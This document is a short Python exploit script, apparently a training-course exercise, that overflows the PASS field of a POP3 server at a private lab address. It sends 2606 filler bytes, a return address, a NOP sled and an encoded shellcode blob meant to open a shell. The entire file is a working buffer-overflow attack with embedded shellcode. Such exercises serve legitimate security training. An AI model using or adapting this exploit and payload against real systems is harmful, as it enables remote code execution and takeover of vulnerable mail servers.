#!/usr/bin/python
#7.7.1 exercises
#question 1 update poc to get the shell


import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf =  ""
buf += "\xdd\xc7\xba\x85\xb1\x6d\x42\xd9\x74\x24\xf4\x5e\x33"
buf += "\xc9\xb1\x54\x31\x56\x18\x03\x56\x18\x83\xee\x79\x53"
buf += "\x98\xbe\x69\x16\x63\x3f\x69\x77\xed\xda\x58\xb7\x89"
buf += "\xaf\xca\x07\xd9\xe2\xe6\xec\x8f\x16\x7d\x80\x07\x18"
buf += "\x36\x2f\x7e\x17\xc7\x1c\x42\x36\x4b\x5f\x97\x98\x72"
buf += "\x90\xea\xd9\xb3\xcd\x07\x8b\x6c\x99\xba\x3c\x19\xd7"
buf += "\x06\xb6\x51\xf9\x0e\x2b\x21\xf8\x3f\xfa\x3a\xa3\x9f"
buf += "\xfc\xef\xdf\xa9\xe6\xec\xda\x60\x9c\xc6\x91\x72\x74"
buf += "\x17\x59\xd8\xb9\x98\xa8\x20\xfd\x1e\x53\x57\xf7\x5d"
buf += "\xee\x60\xcc\x1c\x34\xe4\xd7\x86\xbf\x5e\x3c\x37\x13"
buf += "\x38\xb7\x3b\xd8\x4e\x9f\x5f\xdf\x83\xab\x5b\x54\x22"
buf += "\x7c\xea\x2e\x01\x58\xb7\xf5\x28\xf9\x1d\x5b\x54\x19"
buf += "\xfe\x04\xf0\x51\x12\x50\x89\x3b\x7a\x95\xa0\xc3\x7a"
buf += "\xb1\xb3\xb0\x48\x1e\x68\x5f\xe0\xd7\xb6\x98\x07\xc2"
buf += "\x0f\x36\xf6\xed\x6f\x1e\x3c\xb9\x3f\x08\x95\xc2\xab"
buf += "\xc8\x1a\x17\x41\xcc\x8c\x58\x3e\x81\xd0\x31\x3d\x1e"
buf += "\xf2\xcb\xc8\xf8\x52\x9c\x9a\x54\x12\x4c\x5b\x05\xfa"
buf += "\x86\x54\x7a\x1a\xa9\xbe\x13\xb0\x46\x17\x4b\x2c\xfe"
buf += "\x32\x07\xcd\xff\xe8\x6d\xcd\x74\x19\x91\x83\x7c\x68"
buf += "\x81\xf3\x1c\x92\x59\x03\xb5\x92\x33\x07\x1f\xc4\xab"
buf += "\x05\x46\x22\x74\xf6\xad\x30\x73\x08\x30\x01\x0f\x3e"
buf += "\xa6\x2d\x67\x3e\x26\xae\x77\x68\x2c\xae\x1f\xcc\x14"
buf += "\xfd\x3a\x13\x81\x91\x96\x81\x2a\xc0\x4b\x02\x43\xee"
buf += "\xb2\x64\xcc\x11\x91\xf7\x0b\xed\x67\xd5\xb3\x86\x97"
buf += "\x59\x44\x57\xf2\x59\x14\x3f\x09\x76\x9b\x8f\xf2\x5d"
buf += "\xf4\x87\x79\x33\xb6\x36\x7d\x1e\x16\xe7\x7e\xac\x83"
buf += "\xfe\xf0\x53\x34\xff\xf2\x68\xe2\xc6\x80\xa9\x36\x7d"
buf += "\x9a\x80\x1b\xd4\x31\xea\x08\x26\x10"

buff = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*32 + buf

try:
	print "\nsend evil buffer..."
	s.connect(('192.168.79.134', 110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buff + '\r\n')
	print "\nDone"
except:
	print "Could not connect to POP3"